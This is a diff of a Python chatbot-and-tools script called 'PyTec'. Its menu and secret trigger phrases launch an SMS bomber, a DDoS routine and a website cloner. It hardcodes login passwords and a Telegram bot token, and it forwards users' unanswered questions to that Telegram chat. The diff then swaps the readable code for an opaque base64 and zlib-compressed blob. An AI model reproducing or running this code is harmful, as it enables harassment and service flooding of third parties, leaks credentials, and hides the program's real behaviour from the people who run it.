-    animation_ban(f"{ran} 𝐈 𝐜𝐚𝐧 𝐡𝐞𝐥𝐩 𝐲𝐨𝐮 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐜𝐫𝐞𝐚𝐭𝐨𝐫. 𝐀𝐫𝐞 𝐲𝐨𝐮 𝐢𝐧𝐭𝐞𝐫𝐞𝐬𝐭𝐞𝐝 𝐢𝐧 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐢𝐧𝐠?")
-    choice = input(f"{ran2}Do you want to contact the creator? (y/n): ")
-    if choice.lower() == 'y':
-        print(f"{ran2}Contacting the creator...")
-        time.sleep(2)
-        com("xdg-open http://mk777.rf.gd/?i=1")
-    else:
-        print(f"{ran2}Exiting...")
-        time.sleep(1)
-        menu()
-
-    
-
-
-
-
-    
-
-
-
-
-
-def menu():
-    anim(menu_logo)
-    sel = input(f"{ran2}[>]select option:")
-    if sel == '1':
-        sms_bomber()
-    elif sel == '2':
-        qr_code()
-    elif sel == '3':
-        url_shortner()
-    elif sel == '4':
-        custom_sms()
-    elif sel == '5':
-        web_clone()
-    elif sel == '6':
-        ddos()
-    elif sel in "0":
-        sys.exit()
-
-
-
-
-# listener = sr.Recognizer()
-
-# try:
-#     with sr.Microphone() as mic:
-#         print("Listening...")
-#         voice = listener.listen(mic)
-#         command = listener.recognize_google_cloud(voice)
-#         print(command)
-# except:
-#     pass
-
-
-
-def anim(xak):
-    for x in xak+"\n":
-        sys.stdout.write(x)
-        sys.stdout.flush()
-        time.sleep(0.005)
-
-
-
-# asis = pyttsx3.init()
-# wait = asis.runAndWait()
-# voices = asis.getProperty('voices')
-# rob = asis.setProperty("voice", voices[1].id)
-
-
-
-
-users = {
-    "admin": "Mk-777",
-    "user1": "MuslimUddinMk",
-    "test": "op"
-}
-
-
-pytec()
-username = input(f"{B_CYN}🧑 Username ➤ ")
-password = input(f"{B_CYN}🔒 Password ➤ ")
-
-if username in users and users[username] == password:
-    print(f"\n{B_GRN}✅ Welcome {username}! Login successful 🎉\n")
-else:
-    print(f"{B_RED}❗️ Login failed! Incorrect username or password. Exiting...")
-    exit()
-
-
-
-
-
-
-
-
-
-
-
-
-bot_token = '7903954184:AAF4MyCznsMtDeXC8G_DaopvX66I6qnb_R0'
-chat_id = '6662565190'
-
-
-user_name = input(str(f"{t}Please Type Your UserName: "))
-robo = "PyTec: "
-
-
-def picci():
-    com("clear")
-    print(f"""{RED}
-        ██╗    ██╗
-        ██║    ██║
-        ██║ █╗ ██║
-        ██║███╗██║
-        ╚███╔███╔╝
-         ╚══╝╚══╝ 
-    """)
-    sleep(0.50)
-    print(f"""{GRN}
-        ███████╗
-        ██╔════╝
-        █████╗  
-        ██╔══╝  
-        ███████╗
-        ╚══════╝
-        """)
-    sleep(0.50)
-    print(f"""{YLW}
-        ██╗     
-        ██║     
-        ██║     
-        ██║     
-        ███████╗
-        ╚══════╝
-        """)
-    sleep(0.50)
-    print(f"""{B_CYN}   
-         ██████╗
-        ██╔════╝
-        ██║     
-        ██║     
-        ╚██████╗
-         ╚═════╝
-         """)
-    sleep(0.50)
-    print(f"""{PRP}
-         ██████╗ 
-        ██╔═══██╗
-        ██║   ██║
-        ██║   ██║
-        ╚██████╔╝
-         ╚═════╝ 
-         """)
-    sleep(0.50)
-    print(f"""{CYN}
-        ███╗   ███╗
-        ████╗ ████║
-        ██╔████╔██║
-        ██║╚██╔╝██║
-        ██║ ╚═╝ ██║
-        ╚═╝     ╚═╝
-        """)
-    sleep(0.50)
-    print(f"""{WHT}
-        ███████╗
-        ██╔════╝
-        █████╗  
-        ██╔══╝  
-        ███████╗
-        ╚══════╝
-    """)
-    sleep(0.50)
-    print(f"""
-    {RED}  ██████╗ ██╗ ██████╗ ██████╗██╗
-    {CYN}  ██╔══██╗██║██╔════╝██╔════╝██║
-    {B_BLK}  ██████╔╝██║██║     ██║     ██║
-    {PRP}  ██╔═══╝ ██║██║     ██║     ██║
-    {GRN}  ██║     ██║╚██████╗╚██████╗██║
-    {B_GRN}  ╚═╝     ╚═╝ ╚═════╝ ╚═════╝╚═╝                  
-        {c}""")
-
-
-if "picci" in user_name:
-    anim(f"{robo}{ran} 𝓦𝓸𝔀. 𝓓𝓮𝓪𝓻 𝓟𝓲𝓬𝓬𝓲😍. 𝓝𝓲𝓬𝓮 𝓣𝓸 𝓜𝓮𝓮𝓽 𝓨𝓸𝓾. 𝓦𝓪𝓲𝓽, 𝓘 𝓗𝓪𝓿𝓮 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓕𝓸𝓻 𝓨𝓸𝓾. 𝓨𝓸𝓾 𝓪𝓻𝓮 𝓿𝓮𝓻𝔂 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓽𝓸 𝓶𝔂 𝓫𝓸𝓼𝓼")
-    # asis.say(f"Wow. Dear {user_name}. Nice To Meet You. Wait, I Have special For You. You are very special to my boss")
-    # asis.runAndWait()
-    com("Clear")
-    picci()
-elif "allah" in user_name:
-    anim(f"{robo}{RED} Astaqfirullah!")
-    sys.exit()
-elif "Allah" in user_name:
-    anim(f"{robo}{RED} Astaqfirullah!")
-    sys.exit()
-anim(f"{robo}{ran}hey {user_name}, Welcome To PyTec....")
-# asis.say(f"hey {user_name}, Welcome To PyTec....")
-# asis.runAndWait()
-
-
-
-print(f"{robo}{ran} Do You Have A Question For Me?")
-# asis.say("Do You Have A Question For Me?")
-# asis.runAndWait()
-while True:
-    user = input(str(f"Type any quiestion. \n{user_name}:"))
-    if "Allah" in user:
-        anim(f"{robo}{ran} allah")
-        #asis.say("Allah")
-        #asis.runAndWait()
-    elif "allah" in user:
-        anim(f"{robo}{ran} allah")
-        #asis.say("Allah")
-        #asis.runAndWait()
-    elif "Takbir" in user:
-        anim(f"{robo}{ran} Allahu Akbar")
-        #asis.say("Allahu akbar")
-        #asis.runAndWait()
-    elif "takbir" in user:
-        anim(f"{robo}{ran} Allahu Akbar")
-        #asis.say("Allahu akbar")
-        #asis.runAndWait()
-    elif "Takbir!" in user:
-        anim(f"{robo}{ran} Allahu Akbar")
-        #asis.say("Allahu akbar")
-        #asis.runAndWait()
-    elif "takbir!" in user:
-        anim(f"{robo}{ran} Allahu Akbar")
-        #asis.say("Allahu akbar")
-        #asis.runAndWait()
-    elif "Assalamualaikum" in user:
-        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
-        # asis.say("Walaikumassalam, How Are You?")
-        # asis.runAndWait()
-    #+++++++++++For Automatic++++++++++++++++
-    elif "Mk-777SMSBomb" in user:
-        sms_bomber()
-    elif "Mk-777DDOS" in user:
-        ddos()
-    elif "assalamualaikum" in user:
-        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
-        # asis.say("Walaikumassalam, How Are You?")
-        # asis.runAndWait()
-    elif "I am Fine And You?" in user:
-        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
-        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
-        # asis.runAndWait()
-    elif "I am fine and you?" in user:
-        anim(f"{robo}{ran} I'm doing well, thank God. Is there something you'd like to know?")
-        # asis.say("I'm doing well, thank God. Is there something you'd like to know?")
-        # asis.runAndWait()
-    elif "hello" in user:
-        anim(f"{robo}{ran} hey, Whats up?")
-        # asis.say(f"hey, Whats up?")
-        # asis.runAndWait()
-    elif "Hello" in user:
-        anim(f"{robo}{ran} hey {user_name}, How Can I Help You?")
-        # asis.say(f"hey {user_name}, How Can I Help You?")
-        # asis.runAndWait()
-    elif "hey" in user:
-        anim(f"{robo}{ran} hey {user_name}, Do You Need Help?")
-        # asis.say(f"hey {user_name}, Do You Need My Help?")
-        # asis.runAndWait()
-    elif "how Are You?" in user:
-        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
-        # asis.say("I am Fine. By The Marcy of Allah.")
-        # asis.runAndWait()
-    elif "i am fine and you?" in user:
-        anim(f"{robo}{ran}Alhamdulillah, I am Fine.")
-        # asis.say("Alhamdulillah, I am Fine.")
-    elif "i am fine" in user:
-        anim(f"{robo}{ran}Alhamdulillah, I feel happy.")
-        # asis.say("Alhamdulillah, I feel happy.")
-    elif "how are you?" in user:
-        anim(f"{robo}{ran}I am Fine. By The Marcy of Allah.")
-        # asis.say("I am Fine. By The Marcy of Allah.")
-        # asis.runAndWait()
-    elif "Hey" in user:
-        anim(f"{robo}{ran} Yeah, i am Ready!")
-        # asis.say("Yeah, i am Ready!")
-        # asis.runAndWait()
-    elif "I am Fine and You?" in user:
-        anim(f"{robo}{ran} I am Fine. By The Marcy of Allah.")
-        # asis.say("I am Fine. By The Marcy of Allah.")
-        # asis.runAndWait()
-    elif "Yes I Have" in user:
-        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
-        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
-        # asis.runAndWait()
-    elif "Yes,I Have" in user:
-        anim(f"{robo}{ran} Okay. Tell Me Your Question.")
-        # asis.say("Okay. Tell Me Your Question!")
-        # asis.runAndWait()
-    elif "Yes, i Have" in user:
-        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
-        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
-        # asis.runAndWait()
-    elif "Yes, i have" in user:
-        anim(f"{robo}{ran} Okay, I am ready to hear your questions. Tell Me Your Question.")
-        # asis.say("Okay. I am ready to hear your questions! Tell Me Your Question!")
-        # asis.runAndWait()
-    elif "yes i have same question for you, Are You ready?" in user:
-        anim(f"{robo}{ran} Why Not, I am Ready For Your Question.")
-        # asis.say("Why Not, I am Ready For Your Question!")
-        # asis.runAndWait()
-    elif "who are you?" in user:
-        anim(f"{robo}{ran} I am  PyTec. .")
-        # asis.say("I am  PyTec. ...")
-        # asis.runAndWait()
-    elif "Who are you?" in user:
-        anim(f"{robo}{ran} I am  PyTec. Maked By Mk-777")
-        # asis.say("I am  PyTec. , Maked By Mk-777")
-        # asis.runAndWait()
-    elif "Who Are You?" in user:
-        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
-        # asis.say("I am  PyTec. , Made By Mk-777")
-        # asis.runAndWait()
-    elif "who are you" in user:
-        anim(f"{robo}{ran} I am  PyTec. .")
-        # asis.say("I am  PyTec. ...")
-        # asis.runAndWait()
-    elif "Who Are You" in user:
-        anim(f"{robo}{ran} I am  PyTec. Made By Mk-777")
-        # asis.say("I am  PyTec. Made By Mk-777")
-        # asis.runAndWait()
-    elif "bodda ki hobor?" in user:
-        anim(f"{robo}{ran} Bodda hobor kub Vala")
-        # asis.say("Boddaaa. Hobor. Kub. Valaaa")
-        # asis.runAndWait()
-    elif "Ken Aco?" in user:
-        anim(f"{robo}{ran} Vala Aci, Tui Ken Aco?")
-        # asis.say("Vala Achi, Tui Ken Aco?")
-        # asis.runAndWait()
-    elif "Vala Nai" in user:
-        anim(f"{robo}{ran} kiya?")
-        # asis.say("Kiya?")
-        # asis.runAndWait()
-    elif "yes i need your help" in user:
-        anim(f"{robo}{ran} If you need help, just let me know! I'm ready to help you!")
-        # asis.say("If you need help, just let me know! I'm ready to help you!")
-        # asis.runAndWait()
-    elif "Can you hear me?" in user:
-        anim(f"{robo}{ran} Yes, I can hear you. How can I help you?")
-        # asis.say("Yes, I can hear you. How can I help you?")
-        # asis.runAndWait()
-    elif "I Love You" in user:
-        anim(f"{robo}{ran} he he he😍 Walaikum assalam")
-        # asis.say(" he he he. Walaikum assalam")
-        # asis.runAndWait()
-    elif "Fuck You" in user:
-        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
-        # asis.say("I Am sure, You are Fucking guy.")
-        # asis.runAndWait()
-    elif "Fuck you" in user:
-        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
-        # asis.say("I Am sure, You are Fucking guy.")
-        # asis.runAndWait()
-    elif "fuck You" in user:
-        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
-        # asis.say("I Am sure, You are Fucking guy.")
-        # asis.runAndWait()
-    elif "fuck you" in user:
-        anim(f"{robo}{ran}{r} I Am sure, You are Fucking guy.")
-        # asis.say("I Am sure, You are Fucking guy.")
-        # asis.runAndWait()
-    elif "Nice" in user:
-        anim(f"{robo}{ran} Thanks.")
-        # asis.say("Thanks.")
-        # asis.runAndWait()
-    elif "Nice Answar" in user:
-        anim(f"{robo}{ran} Thank you. {user_name} ")
-        # asis.say(f"Thank You {user_name}")
-        # asis.runAndWait()
-    elif "Jan Re Song" in user:
-        com("xdg-open https://youtu.be/1nteT1LEY4w?list=RD1nteT1LEY4w")
-
-#===================for Tools+===============+++++++++++
-    elif "You Have SMS Bomber Tools?" in user:
-        anim(f"{robo}{ran} Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
-        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
-        # asis.runAndWait()
-        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
-        if "yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            com("Clear")
-            menu()
-        elif "Yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            menu()
-    elif "Do you have tools?" in user:
-        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
-        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
-        # asis.runAndWait()
-        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
-        if "yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            com("Clear")
-            menu()
-        elif "Yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            menu()
-        else:
-            pass
-    elif "Do you have a tools?" in user:
-        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
-        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
-        # asis.runAndWait()
-        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
-        if "yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            com("Clear")
-            menu()
-        elif "Yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
-            # asis.runAndWait()
-            menu()
-        else:
-            pass
-    elif "Tools" in user:
-        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
-        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
-        # asis.runAndWait()
-        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
-        if "yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
-            # asis.say("Sure! Just a moment please. I'm running tools menu.")
-            # asis.runAndWait()
-            com("Clear")
-            menu()
-        elif "Yes" in user_input_for_tools:
-            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
-            # asis.say("Sure! Just a moment, please. I'm runnings.")
-            # asis.runAndWait()
-            menu()
-    elif "exit" in user:
-        sys.exit()
-    elif "Quit" in user:
-        sys.exit()
-    elif "Stop" in user:
-        sys.exit()
-    elif "stop" in user:
-        sys.exit()
-    elif "quit" in user:
-        sys.exit()
-    elif "Exit" in user:
-        sys.exit()
-    else:
-        anim(f"{ran}{user_name}: I have not been trained on this question. But I will learn about it very soon.")
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        payload = {
-            'chat_id': chat_id,
-            'text': user
-        }
-
-        response = requests.post(url, data=payload)
-        if response.status_code == 200:
-            print("Saved!")
-        else:
-            print("Due to some problem, I was unable to save your question. Please ask the question again.")
-
-        # asis.say("I Don't Know About Your Question. Tell Me Someting Else!")
-        # asis.runAndWait()
-        # pywhatkit.search(user)
+import base64 as PzgUWlzo, zlib as KxACeDXV
+jiRdZZZF = ''
+jiRdZZZF += 'eJztfV1zG0eS4Dt/wj2VoJkjMAKbAElRMrWwgl+2OCJFmqBMKyQFogEUgDYb'
+jiRdZZZF += '3VB3gxREc2P2ZvbOe+OZkSzJ9tmmZY/Gsr2ybI19OzN33tmLuI17un+hiH1e'
+jiRdZZZF += '/YTNrKqurv4CQUqW5BlBaLFRlZmVlZWVlfVttDu24xHbHTL4m2e0qf/u0Etd'
+jiRdZZZF += '6nru0NBheLfqdpu07XrXpKTrUrJhO5TolkuaXbNLNihx9dd1j5KO7hhDQ0Oe'
+jiRdZZZF += '05saIvAxVkhJktKa1MtmWp7XmRodNTojesfQanZ79HXXtkYzOQ3/ZnPnMwDt'
+jiRdZZZF += '9DIXGYH2xgEI1Oyu5UkSRoNkZnSraep16rYyxLI9YlhAmbMIn45jWED4QmF8'
+jiRdZZZF += '/HzxxAvF9vl/ffciWTu1UCZry8uLZH159TRZOENmps+8vDg9N18+lcn5uCgz'
+jiRdZZZF += 'zTUp7WTHZSC9bHjZ3BC9XKOdQJQa/23YlqvN2pZFa/g+7zi2w1nhfDSijASw'
+jiRdZZZF += 'ZMWxqyZt58mKSXUoh9kWrW2Qc3bXIQuWRx2LemTaqpPVrkWmm7phCUbjXNqu'
+jiRdZZZF += '5vZcj7azmRrQcgSg4DxUhhGFELlaYMEx7ocvWIBiuZ5umobVJKsCjWiadsEa'
+jiRdZZZF += 'jrFTjLIz3DE6PgGZKOCBHjKWDhOFqU7P89zL4xCYxNVhks6XwJRsHY6WZtEP'
+jiRdZZZF += 'S2FNEEjnTO96drNrHIg3gfsIzAkKyF60JC85NbtO91mOHOlgpchxk1jp9NwW'
+jiRdZZZF += '/KUWdfarWCrqwdhSKSBzieXodiittSoOrdlNy8BKeIACLTMiqwGNg6tdjJQk'
+jiRdZZZF += '0tFdsNZ12iBOO5vjogPrmM04bTLiNMhKb43WtE4vk6qxWy3d2zC8ATMYKguB'
+jiRdZZZF += 'Ctk6mLoKfF4MscqdWhZEd4nr+G0WkB5qONBS2S4JgiA1BANR8EjkS0Yje4wI'
+jiRdZZZF += 'voTawcPRioxgWJ8TVJdR8GTTqWNz6f/CRsl/l/YMERwa5CyQPea/FPs0bAea'
+jiRdZZZF += 'AZP9X6eRyKGZxdPQSvJmo3BivNDODK3Oz6lBRQh6efWMGjQGQecW19WgcQia'
+jiRdZZZF += 'WTyrBk1A0Mrqihp0FIJmz4VoTULQ+qk1NegYBA3NVFTWipy1mYrKXJEzN1NR'
+jiRdZZZF += '2Sty9mYqKoNFwWBFZbHIWZypqEwWOZMzFZXNImdzpqIyWuSMeqXMBS9DDqOY'
+jiRdZZZF += 'Pb065JRU5ni4Q+ugQ1gEZKhZUvnk8U2HUotDDPVKKss8vkdN094SANWSyj4H'
+jiRdZZZF += 'qJpdKqLbJTUjPLrTdTqmD1ArqZniALWe7qe/VVKzx6O3Wobno6MBWGVaSl7q'
+jiRdZZZF += 'Wsy1GBoyDdcrgmTOQ0nkCUg+T0DS4GqsruQJSDJPQHIXGdgYgrEiA5gKB60w'
+jiRdZZZF += 'YFYQ+IchMGFfHIIKAQiu52R51dBqLduo0SxLMZfD+LFUgLEcthtGGwC4RfGc'
+jiRdZZZF += 'Br5kMz8+NfXjpakflzM5cpjUug64qaLuxiuRbhltnVkMkIUacZhZTP2yvpGF'
+jiRdZZZF += 'R5hNlNdldBIhSHqJaEsg9brd9bQtB4SZvZxLimuYXbeVDaIUO1jQCoWjOZZi'
+jiRdZZZF += 'eoJHMheszGNOtViQqY49wWSP8VSl8CtV3XqCyRfGmCcLynAk4bNm26ZL2tTq'
+jiRdZZZF += 'xuOGMLhi2k0b1A488kxmG5V0Z+jBzRsPbl59Nr7vAjfXyME+gPk4sB+882b0'
+jiRdZZZF += 'e/PdB+9cC79fC4fEUPpHqQTDgQmcyOKRYDffT2IMwHYxKgQsi3Y3FpIS7lPe'
+jiRdZZZF += 'SyYsOUhdMhMJj0opFhKVRgxS5GW3n0xEFhSUVDbSOQlJKREyXSY3r8VS6ZPc'
+jiRdZZZF += 'wDKJl3VYwiFOfEGlctIHIB4lVSiqJ/Go3YjGPkLN+/hpmx71e/uxmKHzxYvk'
+jiRdZZZF += '4a33f0aWTpPyUpnMLC/NzK+S7NlOHZoOq5nbA30M0a//kbyyylxk8jI65rqH'
+jiRdZZZF += '7togqY8j+o13ydnVRVL2/frBmZ+4SB58+A///qffkNmu64FbhVnoz3uYwFFM'
+jiRdZZZF += '/62rZJ1Wyaxp7514GH0S0d/+lMzN2WUy7Xl6bWM/6AVgf/ctMn/Z8PZONop9'
+jiRdZZZF += 'kA/HTqw7T+u7OwStfG6I9Zgv15sjdgfceTHW2N44duyY5jS0Zn30pFEqZoRf'
+jiRdZZZF += '4X8Ok3iXbdkye8zDmdEtKM44QIl31qGXS2uh/ro6HoduouJ+cNk9Oy5I/++7'
+jiRdZZZF += 'gt9H0ZLHTuGpuyz9uHp67svAsnqirsxAshJZe3JuTV+unpqLk8zV03Z3Hm8t'
+jiRdZZZF += 'fqZajD7fXcYva1DwhbcSaO3dtlup2u0qdVhfeC+zf8FSDX+qoUmrWnGwSOBg'
+jiRdZZZF += 'lmsveJW7uAXrH56W7M1YxUwjuJdxS5XdHQUpXhF9YpGqFgFII7hnCfkVdyDZ'
+jiRdZZZF += 'pXEXN3b7lV3E2O1Pdim2KMR1yIbsU3Z7iSHVKOymmKvdZKsWsXZpBNOMX4Sg'
+jiRdZZZF += 'bL58G0B4nQ6PgvlO3Q/Bp3sUPy5k/VkXhyyvn4GeHY/96Bb8997f/9ufPzn/'
+jiRdZZZF += 'cPfqW/DcgOdteH4Jz5sYRkTgz8WDgb8iAvq/XwRUIJCY2I3PCJvALyuJPdy9'
+jiRdZZZF += '9r/h+Z/4F3988XD37avw/BoeoP72f4Xn+t75+OBj7OyRV+dXywvLZyT1V0lR'
+jiRdZZZF += 'K+xHFuvzM+WFtXlJIKXDkUTgEYriWW5Gd+VgblB1eNt5yangPPL+G05Gguf8'
+jiRdZZZF += '3oMbf+d/vw3eb34VisKfv1e+9yCEE7jxcwEIIJH3aJRCgMVKAjxSvNxnGF+L'
+jiRdZZZF += 'nwLv/oObvwxxiQC3JXPJlO6JXEhinPMbd0WUhBFJAbG7QabifNz3kZQoDAy/'
+jiRdZZZF += 'hClxWCGD2wgisWUUfr9Lfbn5taAkxXffD3tuSp81U3r9Y3g+wRdI5vqf4LkH'
+jiRdZZZF += 'z1cY8A6+wPNHeP4Rnu/E7z8LwO/65Oy5cX2ixhVta9cxK3I9w/4tbFDz3o38'
+jiRdZZZF += 'iVbIO34XWgD4Ikeph/+IYI78rgwUiNztiqPzofHbCgFZHrf99zsKM18w2kDw'
+jiRdZZZF += 'SyXwaiJjDOw2/31D9MX9au1Hx19u+8jXfCYCt/+m6nVKqEhIHIAHRlBuKykk'
+jiRdZZZF += 'qeIXMdd2NwXgiySUUGC4d/vcGj8b1pgRu4spEJHUJ/B8LgLBMl/9CN8HyMwP'
+jiRdZZZF += '0QD/QCzw1bgRZga4xuaNKmx86PH4t1En9ve+i/j7pG/MMQ5c4pCfnOwGRxL5'
+jiRdZZZF += 'WniP8XQSfOb7iscaREV8XO4SC56+FR6j8HcVV1mEKH4rc04V5zgcFfOlucMs'
+jiRdZZZF += 'nWBJQPWxI35w4PD+PPy9rUYletqCjA8oYu+GvWvFIY+46ElRET+8n7Ot/mTf'
+jiRdZZZF += 'uJcuSpKHfxdEBR75D7cJOLjxf4KmfzA3HL3vf4HnnxUH+w8Y8Vt4PsS/e2Rh'
+jiRdZZZF += '/wb/0az9I5j6Z9rMJ5r2LVqt1Nic/iOadmnCQoZcvodNeNi0haxFMCaRaJKT'
+jiRdZZZF += '8W4HxlAYibuBbRbv94Lko4Mq30abj/uBcVGGEUJDFBF7HB3GuBvG+lqaPlVO'
+jiRdZZZF += 'Iaiw1Q7eUyyun8lgROJ+2CKm2dckExs1ot/9RRjRRzWlz6Ifff2OGKu469vW'
+jiRdZZZF += 'fxI29Y8i4rs9s3EQD/pRHehH8p+fabPax7jW67Zb0dmKpwGtK0k0rylTm+nh'
+jiRdZZZF += 'ey1nCEc9yhTpwDOgoUTS5wwHDE+Y3YtN9j5yIpFptT3nHW8kTxPKEaH9wPef'
+jiRdZZZF += 'PjzgtGI0XNXZH7SZfwQb/yRN/GAjJT8T9K7D82uiEMbRkrcx4AN4vsGX3+CL'
+jiRdZZZF += 'AMXxkw+B6KepeXtu9x//N3HQOsiBXISZsMRSrCJmGpAQHazCDNbl8BYk0n5E'
+jiRdZZZF += 'l+0M+Q0Kb0v88TZ/rA2fb/JEaA2OwkFH7OqXfsDn4vmUqDGfidB7+OO+Qu13'
+jiRdZZZF += 'AgoBPiYiEAM+FsTvqej3tcR05Qt0B69+pfD5kcDF8cFPfaX/QESEkkWsL+DZ'
+jiRdZZZF += 'hed9ZURxV8sIgYwJiTCBvIPRRMDe9X98IAKQjd8RQeVzfLmjMPMVJ4m7cJiw'
+jiRdZZZF += '+a7T9VNrRzLn//Yi6fDd71u64QX73mu4F96wmpqmgaYglrIbaIz9fn4sgcfE'
+jiRdZZZF += '+SwfTBDz3CTXGDPMYoYTdMJnxmqSNZustahMOKoLBW28EBBosA73zhnbo2SK'
+jiRdZZZF += 'bAO9nSIpt10yq1ukjFsKz3aQYvE4WgFy6FBGVSUhwkRtcEEdtra2tKZtN03K'
+jiRdZZZF += 'VCKTZ4zYXa/ENFKWsRXs1zwfbC09HIRezBxR9pzy3Ho1j9a5qosSzUouIuWY'
+jiRdZZZF += 'D/hb4wzkcA+yLPip/TFDgu2x/3r///3p/3/4f38bKWxFNxZcsmLbDuGSs7po'
+jiRdZZZF += 'RkuG1emi8LdrOxes8+TVhdm1hSVy5iyz1xfJFCsIcuT4cYakt7HulJA9jljD'
+jiRdZZZF += '/YLnyfTS8tkzawhPMkcAIxdYZsiFdcHjBfo3UMCj7O1Fst3cKa9NnyPrC2un'
+jiRdZZZF += 'yNLGCLSo5EQuBofoLGmf0Qse/gOAFYe6LpnHjIKp4YYqorRdxyzgHmNhE8Ag'
+jiRdZZZF += 'VKmna8YlRx8xjU2uCxA6ulkcdUHFRmyvM5o5wkXD8Rs+PmpRXWdGBeoYsyxa'
+jiRdZZZF += 'tY5BlmmOIiJQqGcAq0XBlDguYm4r7SNrOE/ZrpcBIcUpZfJR2KDoEGMDqsyI'
+jiRdZZZF += 'jlwnQnrI/iK1ml4Loccm4lAurY3UWiNdHQCGM7Mtx24b3XbmxGYpUxwbgyqR'
+jiRdZZZF += 'gcqXnZ6awc2/LBipkAzYC8c26rgn5lWDbkmE4VgK0zVUY0xf73RMo8bca2Z/'
+jiRdZZZF += 'ob7Ry95oxwSTkyc/Gf1JeibWeh2aRKJPhkbaIEeTYZ0sxuHOutQZmW4CcYRY'
+jiRdZZZF += 'sq8YpqmPHgVPMLtoWN3LJ4ifxWLxBFlptUbWHApmlGxCHwFAyUzXMOujq6+M'
+jiRdZZZF += 'T2tjxWKhAE5koQjKOg0sUhDLacMbPTp+TBufJNnTp9aWFvPENDZw81Ntw86R'
+jiRdZZZF += 'V0EbMBcTkCITOx19oaAVtImJ8YL2Alg5vaE7hqDQL5sgPq9hO21WgILnhGJY'
+jiRdZZZF += 'doymwZTGV1zbMg2Luka7v8a9NiKOiaH1kXWDa1Jbdza0TUPXmp04QhlYewns'
+jiRdZZZF += 'X2ukbHhM/q7epiMu/ugDvGTXGXDNdtx+cHOU1xba7ni9OOAqbVCHOntmdDSO'
+jiRdZZZF += 'yjV1ZN6q2XVoqpBE84rRyRNwQkHINE+qYKuvuF6ClATuIjgNXb3JMkKtkbPl'
+jiRdZZZF += 'PLVOXCpBiYZQsENZ1z29AdYg03YNt44lw00MxvEv329f0c1OSwcbhe1YaAf+'
+jiRdZZZF += 'sF6tAWvNlvH6htm27M4lx/W6m1uXe1eGhaVrqpaqTamlV/UrulOnm9LMNRyo'
+jiRdZZZF += 'Y8xOocFSbBXiZlONVYxYXCa6rPmJdRujXXekBsk7tjki2sCRNvVadh2xVpbL'
+jiRdZZZF += 'awOjCaaZkegCBce4wsxEviZMiAcmJO/ZGzTBaNixyhFkj2tPcg67aET0gYzI'
+jiRdZZZF += '2AmyuvTa+NjxSWE5yitFtByF48UxrVCcHNhwCGNRHENrMVl44QVt4ihZYrZu'
+jiRdZZZF += 'EKPRYJWo3beyXfalClV+a5AqHxB2RZWvOTYUUnKdD6Dr/euyE6/LSeWSUJW5'
+jiRdZZZF += '6o3QflU5FcscrBIzlH01UDs5Ue+xamGsVu+2O268ks1S01xp2RaVViGWsMcT'
+jiRdZZZF += 'jNiIaGLCCtibqh3wHGhwsTMG4WgJqzooVqMBJoUZBFRqZg+WuTlgFqGucyKp'
+jiRdZZZF += '9iBC9HF4LoM3+n0ac4PJ8QSZXTlL+DtZLpPieGWsMs7r1ZJew6DXwjVwsnBU'
+jiRdZZZF += 'K2rFo30b7+I41MFxUftGi0fnixPH/Uo4WZjQEvyOeDu8p+QSmrRoEbpG0+om'
